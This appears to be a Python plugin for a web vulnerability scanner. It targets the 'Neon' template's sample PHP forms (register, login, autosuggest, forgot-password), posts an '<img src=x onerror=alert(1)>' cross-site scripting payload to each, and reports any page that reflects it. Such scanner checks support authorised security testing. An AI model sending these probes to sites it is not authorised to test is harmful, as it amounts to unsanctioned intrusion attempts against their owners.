#!/usr/bin/env python3

from libs import NewRequest as nq
from libs import post_data
from core import ShowMessage as show
from core import info,bad
from urllib.parse import urlparse,urljoin


def add_path(url):
    paths = [
            "data/sample-register-form.php",
            "data/sample-login-form.php",
            "data/autosuggest-remote.php",
            "data/sample-forgotpassword-form.php",
            "data/login-form.php"
            ]
    urls = []
    for path in paths:
        urls.append(urljoin(url,path))
    return urls
def main(opts):
    NEON_CVE(opts['url'])
def NEON_CVE(url):
    urls = add_path(url)
    for u in urls:
        r = nq.Post(u,post_data('q=<img src=x onerror=alert(1)>'))
        if '<img src=x onerror=alert(1)>'.encode('utf-8') in r.content:
            show.bug(bug='Cross-site scripting',payload='<img src=x onerror=alert(1)>',method='GET',parameter='q',target=u,link='q=<img src=x onerror=alert(1)>')
